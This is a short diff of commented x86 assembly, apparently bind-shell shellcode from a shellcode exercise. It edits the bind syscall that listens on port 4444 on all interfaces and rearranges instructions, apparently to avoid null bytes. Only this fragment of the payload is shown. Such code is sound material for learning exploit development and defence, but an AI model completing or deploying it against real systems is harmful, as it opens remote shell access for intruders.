@@ -24,14 +24,14 @@ _start:
     
         ; bind syscall
 	XOR  ECX, ECX    ; clear ECX so that we can push zero to the stack
-	PUSH ECX         ; push zero_sin = 0 to the stack
 	PUSH ECX         ; push INADDR_ANY = 0.0.0.0 to the stack
-	PUSH word 0xc511 ; push hex 0x115c (dec 4444) in reverse oreder due to little endian
-	PUSH byte 0x02   ; push hex 0x02 (dec 2) on the stack. 2 represents AF_INET
+        PUSH ECX
+	PUSH word 0x5c11 ; push hex 0x115c (dec 4444) in reverse oreder due to little endian
+	PUSH word 0x2   ; push hex 0x02 (dec 2) on the stack. 2 represents AF_INET
+	MOV ECX, ESP     ; move address pointing to the top of the stack to ECX
 
 	MOV EBX, EAX     ; copy value from EAX to EBX, EAX holds pointer to socket descriptor as result of socket call
-	MOV EAX, 0x169   ; move bind syscall number in EAX register
-	MOV ECX, ESP     ; move address pointing to the top of the stack to ECX
+	MOV AX, 0x169    ; move bind syscall number in EAX register
 	MOV DL, 0x16     ; move value 0x16 to EDX as third parameter
 	INT 0x80         ; interrupt
 
